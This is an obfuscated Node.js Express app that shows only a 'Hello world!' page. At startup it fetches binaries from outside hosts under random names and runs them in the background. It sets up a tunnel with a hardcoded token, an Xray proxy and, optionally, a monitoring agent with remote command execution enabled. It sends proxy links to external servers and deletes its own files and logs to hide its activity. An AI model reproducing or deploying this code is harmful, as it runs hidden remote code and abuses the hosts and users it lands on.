const _0x562e2d=_0x1e76;function _0x4581(){const _0x36344d=['text/plain;\x20charset=utf-8','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','base64','del\x20/f\x20/q\x20','config.json','floor','FILE_PATH','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','pipe','close','unlink','list.txt','https://arm64.ssss.nyc.mn/v1','20kNuoJW','utf-8','platform','includes','filter','2053','294853NlLjkg','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','&fp=firefox&type=ws&host=','ARGO_AUTH','\x22\x20>\x20/dev/null\x202>&1','arm64','17768MLfeKD','substring','split','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','response','fileUrl','Error\x20reading\x20boot.log:','false','post','match','/vless-argo','2199772mrCEuc','get','data','readdirSync','934842ESGUdX','ARGO_PORT','\x20successfully','\x0avless://','tls','error','random','clear','\x0aclient_secret:\x20','then','abcdefghijklmnopqrstuvwxyz','mkdirSync','2xizZFj','writeFileSync','/config.json\x20>/dev/null\x202>&1\x20&','vmess','/sub.txt\x20saved\x20successfully','&path=%2Ftrojan-argo%3Fed%3D2560#','win32','http\x20server\x20is\x20running\x20on\x20port:','https://arm64.ssss.nyc.mn/bot','Nodes\x20uploaded\x20successfully','2083','message','application/json','Subscription\x20uploaded\x20successfully','\x20-c\x20','127.0.0.1','php\x20running\x20error:\x20','5yXfsGG','Error\x20downloading\x20files:','/api/add-nodes','quic','charAt','basename','2096','arch','xtls-rprx-vision','ARGO_DOMAIN','has','tcp','env','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','set','.exe\x20>\x20nul\x202>&1','aarch64','9230727VETLpf','listen','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','forEach','stream','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','\x20-s\x20','\x20is\x20created','join','UPLOAD_URL','Railway','\x20-p\x20','\x20>/dev/null\x202>&1\x20&','\x20failed:\x20','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','https://arm64.ssss.nyc.mn/agent','createWriteStream','config.yaml','https+local://8.8.8.8/dns-query','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','221943YppDwZ','cdns.doon.eu.org','App\x20is\x20running','https://amd64.ssss.nyc.mn/v1','vless','tunnel.json','isFile','none','Download\x20','amd','PORT','send','tunnel.yml','arm','boot.log','\x20-c\x20\x22','NAME','toString','CFIP','\x0a\x20\x20\x0avmess://','2087','https://amd64.ssss.nyc.mn/web','/vmess-argo','\x20already\x20exists','block','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','Error\x20in\x20startserver:','unshift','push','443','UUID','pop','TunnelSecret','util','SERVER_PORT','\x0a\x20\x20\x0atrojan://','/trojan-argo','unlinkSync','eyJhIjoiZDJhZmE5NDA1MDQxYTA1ZTg3MDA5ZDBmNDJkNDYxNDkiLCJ0IjoiYTkyNDkzMGUtMzhlOS00OTEzLWI4MzItMTFlMzc1OGVlYjU0IiwicyI6Ik4yVTJNV0ZoTUdRdE9XVm1aUzAwTVRVeExUbGlZMll0TVRVNE5EQTNaakZrT0RVMyJ9','child_process','http','133LKkKcb','Hello\x20world!','ARGO_DOMAIN:','\x0a\x20\x20tunnel:\x20','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','SUB_PATH','Empowerment\x20success\x20for\x20','\x20is\x20running','firefox','length','log','/api/delete-nodes','test','trim','sub','https://oooo.serv00.net/add-url','taskkill\x20/f\x20/im\x20','path','catch','369909bSnYkl','/dev/null','Add\x20automatic\x20access\x20task\x20faild:\x20','status','from','NEZHA_SERVER','8443','https://amd64.ssss.nyc.mn/bot','pkill\x20-f\x20\x22[','true','\x20>/dev/null\x202>&1','NEZHA\x20variable\x20is\x20empty,skip\x20running','stringify','?security=tls&sni=','existsSync','npm\x20running\x20error:\x20','readFileSync','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','?encryption=none&security=tls&sni=','map','jiujiu.1.1.b.0.d.0.0.0.0.7.4.0.1.0.0.2.ip6.arpa','nohup\x20','automatic\x20access\x20task\x20added\x20successfully','/config.yaml\x22\x20>/dev/null\x202>&1\x20&'];_0x4581=function(){return _0x36344d;};return _0x4581();}(function(_0x2f333a,_0x490c82){const _0xc0fa9b=_0x1e76,_0x2c3da3=_0x2f333a();while(!![]){try{const _0x41b7cd=parseInt(_0xc0fa9b(0x153))/0x1+parseInt(_0xc0fa9b(0x174))/0x2*(parseInt(_0xc0fa9b(0xeb))/0x3)+parseInt(_0xc0fa9b(0x164))/0x4*(-parseInt(_0xc0fa9b(0x185))/0x5)+-parseInt(_0xc0fa9b(0x168))/0x6+-parseInt(_0xc0fa9b(0x114))/0x7*(-parseInt(_0xc0fa9b(0x159))/0x8)+parseInt(_0xc0fa9b(0x127))/0x9*(parseInt(_0xc0fa9b(0x14d))/0xa)+parseInt(_0xc0fa9b(0xd7))/0xb;if(_0x41b7cd===_0x490c82)break;else _0x2c3da3['push'](_0x2c3da3['shift']());}catch(_0x84496c){_0x2c3da3['push'](_0x2c3da3['shift']());}}}(_0x4581,0x98fd2));const express=require('express'),app=express(),axios=require('axios'),os=require('os'),fs=require('fs'),path=require(_0x562e2d(0x125)),{promisify}=require(_0x562e2d(0x10c)),exec=promisify(require('child_process')['exec']),{execSync}=require(_0x562e2d(0x112)),UPLOAD_URL=process[_0x562e2d(0xd2)][_0x562e2d(0xe0)]||'',PROJECT_URL=process['env']['PROJECT_URL']||'',AUTO_ACCESS=process[_0x562e2d(0xd2)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x562e2d(0xd2)][_0x562e2d(0x146)]||'./tmp',SUB_PATH=process[_0x562e2d(0xd2)][_0x562e2d(0x119)]||_0x562e2d(0x122),PORT=process[_0x562e2d(0xd2)][_0x562e2d(0x10d)]||process[_0x562e2d(0xd2)][_0x562e2d(0xf5)]||0xbb8,UUID=process['env'][_0x562e2d(0x109)]||'b2eb7bbd-2da8-442e-a1d3-5292ee0d3b64',NEZHA_SERVER=process['env'][_0x562e2d(0x12c)]||'',NEZHA_PORT=process[_0x562e2d(0xd2)]['NEZHA_PORT']||'',NEZHA_KEY=process[_0x562e2d(0xd2)]['NEZHA_KEY']||'',ARGO_DOMAIN=process[_0x562e2d(0xd2)][_0x562e2d(0xcf)]||_0x562e2d(0x13c),ARGO_AUTH=process[_0x562e2d(0xd2)][_0x562e2d(0x156)]||_0x562e2d(0x111),ARGO_PORT=process['env'][_0x562e2d(0x169)]||0x1f41,CFIP=process[_0x562e2d(0xd2)][_0x562e2d(0xfd)]||_0x562e2d(0xec),CFPORT=process[_0x562e2d(0xd2)]['CFPORT']||0x1bb,NAME=process['env'][_0x562e2d(0xfb)]||_0x562e2d(0xe1);!fs[_0x562e2d(0x135)](FILE_PATH)?(fs[_0x562e2d(0x173)](FILE_PATH),console[_0x562e2d(0x11e)](FILE_PATH+_0x562e2d(0xde))):console[_0x562e2d(0x11e)](FILE_PATH+_0x562e2d(0x102));function generateRandomName(){const _0x1943a3=_0x562e2d,_0x34aa38=_0x1943a3(0x172);let _0x3023a5='';for(let _0x366581=0x0;_0x366581<0x6;_0x366581++){_0x3023a5+=_0x34aa38[_0x1943a3(0xca)](Math[_0x1943a3(0x145)](Math[_0x1943a3(0x16e)]()*_0x34aa38[_0x1943a3(0x11d)]));}return _0x3023a5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x562e2d(0xdf)](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x562e2d(0xdf)](FILE_PATH,webName),botPath=path['join'](FILE_PATH,botName),subPath=path['join'](FILE_PATH,'sub.txt'),listPath=path[_0x562e2d(0xdf)](FILE_PATH,_0x562e2d(0x14b)),bootLogPath=path[_0x562e2d(0xdf)](FILE_PATH,_0x562e2d(0xf9)),configPath=path[_0x562e2d(0xdf)](FILE_PATH,_0x562e2d(0x144));function deleteNodes(){const _0xd97b53=_0x562e2d;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0xc6790d;try{_0xc6790d=fs['readFileSync'](subPath,'utf-8');}catch{return null;}const _0x1fdfd7=Buffer[_0xd97b53(0x12b)](_0xc6790d,_0xd97b53(0x142))[_0xd97b53(0xfc)](_0xd97b53(0x14e)),_0x5ecefe=_0x1fdfd7[_0xd97b53(0x15b)]('\x0a')[_0xd97b53(0x151)](_0x706cbc=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x706cbc));if(_0x5ecefe[_0xd97b53(0x11d)]===0x0)return;return axios[_0xd97b53(0x161)](UPLOAD_URL+_0xd97b53(0x11f),JSON['stringify']({'nodes':_0x5ecefe}),{'headers':{'Content-Type':_0xd97b53(0x180)}})[_0xd97b53(0x126)](_0x3921d3=>{return null;}),null;}catch(_0x1d8600){return null;}}function cleanupOldFiles(){const _0x4260e2=_0x562e2d;try{const _0x1d3d12=fs[_0x4260e2(0x167)](FILE_PATH);_0x1d3d12[_0x4260e2(0xda)](_0x2f6399=>{const _0x47b811=_0x4260e2,_0x4714cb=path[_0x47b811(0xdf)](FILE_PATH,_0x2f6399);try{const _0x3decec=fs['statSync'](_0x4714cb);_0x3decec[_0x47b811(0xf1)]()&&fs[_0x47b811(0x110)](_0x4714cb);}catch(_0x4d33fc){}});}catch(_0x1fd0a6){}}app[_0x562e2d(0x165)]('/',function(_0x337cd8,_0x28f9ad){const _0x53d3bd=_0x562e2d;_0x28f9ad[_0x53d3bd(0xf6)](_0x53d3bd(0x115));});async function generateConfig(){const _0x5880d8=_0x562e2d,_0xa5fd48={'log':{'access':_0x5880d8(0x128),'error':_0x5880d8(0x128),'loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x5880d8(0xef),'settings':{'clients':[{'id':UUID,'flow':_0x5880d8(0xce)}],'decryption':_0x5880d8(0xf2),'fallbacks':[{'dest':0xbb9},{'path':_0x5880d8(0x163),'dest':0xbba},{'path':_0x5880d8(0x101),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x5880d8(0xd1)}},{'port':0xbb9,'listen':_0x5880d8(0x183),'protocol':_0x5880d8(0xef),'settings':{'clients':[{'id':UUID}],'decryption':_0x5880d8(0xf2)},'streamSettings':{'network':_0x5880d8(0xd1),'security':'none'}},{'port':0xbba,'listen':_0x5880d8(0x183),'protocol':'vless','settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5880d8(0xf2)},'streamSettings':{'network':'ws','security':_0x5880d8(0xf2),'wsSettings':{'path':_0x5880d8(0x163)}},'sniffing':{'enabled':!![],'destOverride':[_0x5880d8(0x113),_0x5880d8(0x16c),_0x5880d8(0xc9)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5880d8(0x183),'protocol':_0x5880d8(0x177),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':'/vmess-argo'}},'sniffing':{'enabled':!![],'destOverride':['http',_0x5880d8(0x16c),_0x5880d8(0xc9)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5880d8(0x183),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x5880d8(0xf2),'wsSettings':{'path':_0x5880d8(0x10f)}},'sniffing':{'enabled':!![],'destOverride':[_0x5880d8(0x113),_0x5880d8(0x16c),_0x5880d8(0xc9)],'metadataOnly':![]}}],'dns':{'servers':[_0x5880d8(0xe9)]},'outbounds':[{'protocol':'freedom','tag':'direct'},{'protocol':'blackhole','tag':_0x5880d8(0x103)}]};fs[_0x5880d8(0x175)](path['join'](FILE_PATH,_0x5880d8(0x144)),JSON[_0x5880d8(0x133)](_0xa5fd48,null,0x2));}function getSystemArchitecture(){const _0x2e2632=_0x562e2d,_0x2d384f=os[_0x2e2632(0xcd)]();return _0x2d384f===_0x2e2632(0xf8)||_0x2d384f===_0x2e2632(0x158)||_0x2d384f===_0x2e2632(0xd6)?_0x2e2632(0xf8):_0x2e2632(0xf4);}function _0x1e76(_0x55570d,_0x239250){const _0x458133=_0x4581();return _0x1e76=function(_0x1e766e,_0x768ab1){_0x1e766e=_0x1e766e-0xc8;let _0x42e9ec=_0x458133[_0x1e766e];return _0x42e9ec;},_0x1e76(_0x55570d,_0x239250);}function downloadFile(_0x392c69,_0x44dab4,_0xbdbc7f){const _0x5e202=_0x562e2d,_0x3ffb54=_0x392c69;!fs[_0x5e202(0x135)](FILE_PATH)&&fs[_0x5e202(0x173)](FILE_PATH,{'recursive':!![]});const _0x3189da=fs[_0x5e202(0xe7)](_0x3ffb54);axios({'method':_0x5e202(0x165),'url':_0x44dab4,'responseType':_0x5e202(0xdb)})[_0x5e202(0x171)](_0x1dd1e7=>{const _0x130c0f=_0x5e202;_0x1dd1e7[_0x130c0f(0x166)][_0x130c0f(0x148)](_0x3189da),_0x3189da['on']('finish',()=>{const _0xbca8b=_0x130c0f;_0x3189da[_0xbca8b(0x149)](),console[_0xbca8b(0x11e)](_0xbca8b(0xf3)+path[_0xbca8b(0xcb)](_0x3ffb54)+_0xbca8b(0x16a)),_0xbdbc7f(null,_0x3ffb54);}),_0x3189da['on'](_0x130c0f(0x16d),_0x2d3a52=>{const _0x552d80=_0x130c0f;fs[_0x552d80(0x14a)](_0x3ffb54,()=>{});const _0x32a49d=_0x552d80(0xf3)+path[_0x552d80(0xcb)](_0x3ffb54)+_0x552d80(0xe4)+_0x2d3a52[_0x552d80(0x17f)];console['error'](_0x32a49d),_0xbdbc7f(_0x32a49d);});})[_0x5e202(0x126)](_0x1a3122=>{const _0x510174=_0x5e202,_0x5257aa=_0x510174(0xf3)+path[_0x510174(0xcb)](_0x3ffb54)+_0x510174(0xe4)+_0x1a3122[_0x510174(0x17f)];console['error'](_0x5257aa),_0xbdbc7f(_0x5257aa);});}async function downloadFilesAndRun(){const _0x2316d4=_0x562e2d,_0x4aeaf0=getSystemArchitecture(),_0x5b8234=getFilesForArchitecture(_0x4aeaf0);if(_0x5b8234[_0x2316d4(0x11d)]===0x0){console['log'](_0x2316d4(0xd3));return;}const _0x1e5da7=_0x5b8234[_0x2316d4(0x13b)](_0x4a900f=>{return new Promise((_0x3cb9b6,_0xcafa30)=>{const _0x441635=_0x1e76;downloadFile(_0x4a900f['fileName'],_0x4a900f[_0x441635(0x15e)],(_0x45c28e,_0xefe771)=>{_0x45c28e?_0xcafa30(_0x45c28e):_0x3cb9b6(_0xefe771);});});});try{await Promise['all'](_0x1e5da7);}catch(_0x5c3364){console[_0x2316d4(0x16d)](_0x2316d4(0x186),_0x5c3364);return;}function _0xf86a4b(_0xff46ac){const _0x5bd887=_0x2316d4,_0xb40ad9=0x1fd;_0xff46ac[_0x5bd887(0xda)](_0x46854b=>{const _0x4d03bb=_0x5bd887;fs[_0x4d03bb(0x135)](_0x46854b)&&fs['chmod'](_0x46854b,_0xb40ad9,_0x2617f6=>{const _0x14b069=_0x4d03bb;_0x2617f6?console[_0x14b069(0x16d)]('Empowerment\x20failed\x20for\x20'+_0x46854b+':\x20'+_0x2617f6):console['log'](_0x14b069(0x11a)+_0x46854b+':\x20'+_0xb40ad9['toString'](0x8));});});}const _0x2beaea=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0xf86a4b(_0x2beaea);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3ef174=NEZHA_SERVER[_0x2316d4(0x150)](':')?NEZHA_SERVER[_0x2316d4(0x15b)](':')[_0x2316d4(0x10a)]():'',_0xb6dcc7=new Set([_0x2316d4(0x108),_0x2316d4(0x12d),'2096',_0x2316d4(0xff),_0x2316d4(0x17e),_0x2316d4(0x152)]),_0x1973af=_0xb6dcc7[_0x2316d4(0xd0)](_0x3ef174)?_0x2316d4(0x130):_0x2316d4(0x160),_0xc0f726=_0x2316d4(0x170)+NEZHA_KEY+_0x2316d4(0xe5)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x1973af+_0x2316d4(0xd9)+UUID;fs[_0x2316d4(0x175)](path['join'](FILE_PATH,_0x2316d4(0xe8)),_0xc0f726);const _0xf312dc='nohup\x20'+phpPath+_0x2316d4(0xfa)+FILE_PATH+_0x2316d4(0x13f);try{await exec(_0xf312dc),console[_0x2316d4(0x11e)](phpName+_0x2316d4(0x11b)),await new Promise(_0x18daab=>setTimeout(_0x18daab,0x3e8));}catch(_0x20cb0c){console['error'](_0x2316d4(0x184)+_0x20cb0c);}}else{let _0x5309ad='';const _0x118216=['443',_0x2316d4(0x12d),_0x2316d4(0xcc),_0x2316d4(0xff),'2083',_0x2316d4(0x152)];_0x118216[_0x2316d4(0x150)](NEZHA_PORT)&&(_0x5309ad='--tls');const _0x4cbf7b=_0x2316d4(0x13d)+npmPath+_0x2316d4(0xdd)+NEZHA_SERVER+':'+NEZHA_PORT+_0x2316d4(0xe2)+NEZHA_KEY+'\x20'+_0x5309ad+_0x2316d4(0x141);try{await exec(_0x4cbf7b),console[_0x2316d4(0x11e)](npmName+'\x20is\x20running'),await new Promise(_0x521884=>setTimeout(_0x521884,0x3e8));}catch(_0xd8f97b){console[_0x2316d4(0x16d)](_0x2316d4(0x136)+_0xd8f97b);}}}else console[_0x2316d4(0x11e)](_0x2316d4(0x132));const _0x3d22e9=_0x2316d4(0x13d)+webPath+_0x2316d4(0x182)+FILE_PATH+_0x2316d4(0x176);try{await exec(_0x3d22e9),console['log'](webName+_0x2316d4(0x11b)),await new Promise(_0x59bffe=>setTimeout(_0x59bffe,0x3e8));}catch(_0xbe3022){console[_0x2316d4(0x16d)]('web\x20running\x20error:\x20'+_0xbe3022);}if(fs[_0x2316d4(0x135)](botPath)){let _0x8263df;if(ARGO_AUTH[_0x2316d4(0x162)](/^[A-Z0-9a-z=]{120,250}$/))_0x8263df=_0x2316d4(0x147)+ARGO_AUTH;else ARGO_AUTH[_0x2316d4(0x162)](/TunnelSecret/)?_0x8263df=_0x2316d4(0x104)+FILE_PATH+'/tunnel.yml\x20run':_0x8263df=_0x2316d4(0x118)+FILE_PATH+_0x2316d4(0x154)+ARGO_PORT;try{await exec(_0x2316d4(0x13d)+botPath+'\x20'+_0x8263df+'\x20>/dev/null\x202>&1\x20&'),console[_0x2316d4(0x11e)](botName+_0x2316d4(0x11b)),await new Promise(_0x509181=>setTimeout(_0x509181,0x7d0));}catch(_0x3c3468){console[_0x2316d4(0x16d)]('Error\x20executing\x20command:\x20'+_0x3c3468);}}await new Promise(_0x24ce78=>setTimeout(_0x24ce78,0x1388));}function getFilesForArchitecture(_0x59bce0){const _0x323fbe=_0x562e2d;let _0x44faee;_0x59bce0===_0x323fbe(0xf8)?_0x44faee=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x323fbe(0x17c)}]:_0x44faee=[{'fileName':webPath,'fileUrl':_0x323fbe(0x100)},{'fileName':botPath,'fileUrl':_0x323fbe(0x12e)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x56e38c=_0x59bce0===_0x323fbe(0xf8)?_0x323fbe(0xe6):'https://amd64.ssss.nyc.mn/agent';_0x44faee[_0x323fbe(0x106)]({'fileName':npmPath,'fileUrl':_0x56e38c});}else{const _0x5cd201=_0x59bce0==='arm'?_0x323fbe(0x14c):_0x323fbe(0xee);_0x44faee['unshift']({'fileName':phpPath,'fileUrl':_0x5cd201});}}return _0x44faee;}function argoType(){const _0x3c5475=_0x562e2d;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3c5475(0x11e)](_0x3c5475(0x139));return;}if(ARGO_AUTH[_0x3c5475(0x150)](_0x3c5475(0x10b))){fs['writeFileSync'](path[_0x3c5475(0xdf)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x313ed2=_0x3c5475(0x117)+ARGO_AUTH['split']('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3c5475(0xdf)](FILE_PATH,_0x3c5475(0xf0))+_0x3c5475(0x15c)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+'\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20';fs[_0x3c5475(0x175)](path['join'](FILE_PATH,_0x3c5475(0xf7)),_0x313ed2);}else console[_0x3c5475(0x11e)](_0x3c5475(0xea));}argoType();async function extractDomains(){const _0xacfc81=_0x562e2d;let _0xf352bf;if(ARGO_AUTH&&ARGO_DOMAIN)_0xf352bf=ARGO_DOMAIN,console[_0xacfc81(0x11e)](_0xacfc81(0x116),_0xf352bf),await _0x3a4fbd(_0xf352bf);else try{const _0x153ba6=fs[_0xacfc81(0x137)](path[_0xacfc81(0xdf)](FILE_PATH,'boot.log'),'utf-8'),_0x539278=_0x153ba6[_0xacfc81(0x15b)]('\x0a'),_0x1baab7=[];_0x539278['forEach'](_0x1d8d00=>{const _0x5c4841=_0xacfc81,_0x52e140=_0x1d8d00[_0x5c4841(0x162)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x52e140){const _0x5af9f8=_0x52e140[0x1];_0x1baab7[_0x5c4841(0x107)](_0x5af9f8);}});if(_0x1baab7['length']>0x0)_0xf352bf=_0x1baab7[0x0],console[_0xacfc81(0x11e)]('ArgoDomain:',_0xf352bf),await _0x3a4fbd(_0xf352bf);else{console[_0xacfc81(0x11e)](_0xacfc81(0xdc)),fs['unlinkSync'](path['join'](FILE_PATH,_0xacfc81(0xf9)));async function _0x3007c9(){const _0xa21c9e=_0xacfc81;try{process['platform']===_0xa21c9e(0x17a)?await exec(_0xa21c9e(0x124)+botName+_0xa21c9e(0xd5)):await exec(_0xa21c9e(0x12f)+botName[_0xa21c9e(0xca)](0x0)+']'+botName[_0xa21c9e(0x15a)](0x1)+_0xa21c9e(0x157));}catch(_0x36b556){}}_0x3007c9(),await new Promise(_0x2d04f9=>setTimeout(_0x2d04f9,0xbb8));const _0x30d908='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0xacfc81(0x154)+ARGO_PORT;try{await exec(_0xacfc81(0x13d)+botPath+'\x20'+_0x30d908+_0xacfc81(0xe3)),console[_0xacfc81(0x11e)](botName+_0xacfc81(0x11b)),await new Promise(_0x44229c=>setTimeout(_0x44229c,0xbb8)),await extractDomains();}catch(_0x423e33){console[_0xacfc81(0x16d)]('Error\x20executing\x20command:\x20'+_0x423e33);}}}catch(_0x56933f){console['error'](_0xacfc81(0x15f),_0x56933f);}async function _0x3a4fbd(_0x38d75b){const _0x1af645=_0xacfc81,_0x3f9eac=execSync(_0x1af645(0x138),{'encoding':'utf-8'}),_0x3b5f06=_0x3f9eac[_0x1af645(0x121)](),_0x3732c1=NAME?NAME+'-'+_0x3b5f06:_0x3b5f06;return new Promise(_0x4d357b=>{setTimeout(()=>{const _0x37588f=_0x1e76,_0x416533={'v':'2','ps':''+_0x3732c1,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x37588f(0xf2),'net':'ws','type':_0x37588f(0xf2),'host':_0x38d75b,'path':'/vmess-argo?ed=2560','tls':_0x37588f(0x16c),'sni':_0x38d75b,'alpn':'','fp':_0x37588f(0x11c)},_0x1dfe2a=_0x37588f(0x16b)+UUID+'@'+CFIP+':'+CFPORT+_0x37588f(0x13a)+_0x38d75b+_0x37588f(0x155)+_0x38d75b+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x3732c1+_0x37588f(0xfe)+Buffer[_0x37588f(0x12b)](JSON['stringify'](_0x416533))[_0x37588f(0xfc)](_0x37588f(0x142))+_0x37588f(0x10e)+UUID+'@'+CFIP+':'+CFPORT+_0x37588f(0x134)+_0x38d75b+_0x37588f(0x155)+_0x38d75b+_0x37588f(0x179)+_0x3732c1+'\x0a\x20\x20\x20\x20';console[_0x37588f(0x11e)](Buffer['from'](_0x1dfe2a)[_0x37588f(0xfc)]('base64')),fs[_0x37588f(0x175)](subPath,Buffer[_0x37588f(0x12b)](_0x1dfe2a)[_0x37588f(0xfc)](_0x37588f(0x142))),console[_0x37588f(0x11e)](FILE_PATH+_0x37588f(0x178)),uploadNodes(),app[_0x37588f(0x165)]('/'+SUB_PATH,(_0x2c7d5d,_0x5569ed)=>{const _0x4d9496=_0x37588f,_0xedf9ad=Buffer[_0x4d9496(0x12b)](_0x1dfe2a)[_0x4d9496(0xfc)](_0x4d9496(0x142));_0x5569ed[_0x4d9496(0xd4)]('Content-Type',_0x4d9496(0x140)),_0x5569ed['send'](_0xedf9ad);}),_0x4d357b(_0x1dfe2a);},0x7d0);});}}async function uploadNodes(){const _0x404119=_0x562e2d;if(UPLOAD_URL&&PROJECT_URL){const _0x19dec8=PROJECT_URL+'/'+SUB_PATH,_0x27bb89={'subscription':[_0x19dec8]};try{const _0x465493=await axios[_0x404119(0x161)](UPLOAD_URL+'/api/add-subscriptions',_0x27bb89,{'headers':{'Content-Type':_0x404119(0x180)}});return _0x465493&&_0x465493[_0x404119(0x12a)]===0xc8?(console['log'](_0x404119(0x181)),_0x465493):null;}catch(_0x4914dd){if(_0x4914dd[_0x404119(0x15d)]){if(_0x4914dd[_0x404119(0x15d)][_0x404119(0x12a)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x404119(0x135)](listPath))return;const _0x3963dc=fs[_0x404119(0x137)](listPath,_0x404119(0x14e)),_0x42257d=_0x3963dc[_0x404119(0x15b)]('\x0a')[_0x404119(0x151)](_0xd695ff=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x404119(0x120)](_0xd695ff));if(_0x42257d[_0x404119(0x11d)]===0x0)return;const _0x1478ea=JSON[_0x404119(0x133)]({'nodes':_0x42257d});try{const _0x1ee3ad=await axios[_0x404119(0x161)](UPLOAD_URL+_0x404119(0xc8),_0x1478ea,{'headers':{'Content-Type':_0x404119(0x180)}});return _0x1ee3ad&&_0x1ee3ad[_0x404119(0x12a)]===0xc8?(console[_0x404119(0x11e)](_0x404119(0x17d)),_0x1ee3ad):null;}catch(_0xc4cf4b){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x332476=_0x1e76,_0xd98d27=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0xd98d27['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0xd98d27[_0x332476(0x107)](phpPath);process[_0x332476(0x14f)]===_0x332476(0x17a)?exec(_0x332476(0x143)+_0xd98d27[_0x332476(0xdf)]('\x20')+'\x20>\x20nul\x202>&1',_0x4f2e2=>{const _0x36c383=_0x332476;console[_0x36c383(0x16f)](),console[_0x36c383(0x11e)](_0x36c383(0xed)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0xd98d27[_0x332476(0xdf)]('\x20')+_0x332476(0x131),_0x71eedf=>{const _0x1f86e9=_0x332476;console[_0x1f86e9(0x16f)](),console[_0x1f86e9(0x11e)](_0x1f86e9(0xed)),console[_0x1f86e9(0x11e)]('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x4ebf56=_0x562e2d;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x4ebf56(0x11e)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x22d480=await axios[_0x4ebf56(0x161)](_0x4ebf56(0x123),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4ebf56(0x180)}});return console['log'](_0x4ebf56(0x13e)),_0x22d480;}catch(_0x435a97){return console[_0x4ebf56(0x16d)](_0x4ebf56(0x129)+_0x435a97[_0x4ebf56(0x17f)]),null;}}async function startserver(){const _0x341660=_0x562e2d;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x5a3cc6){console[_0x341660(0x16d)](_0x341660(0x105),_0x5a3cc6);}}startserver()['catch'](_0x58a416=>{const _0x433942=_0x562e2d;console[_0x433942(0x16d)]('Unhandled\x20error\x20in\x20startserver:',_0x58a416);}),app[_0x562e2d(0xd8)](PORT,()=>console[_0x562e2d(0x11e)](_0x562e2d(0x17b)+PORT+'!'));
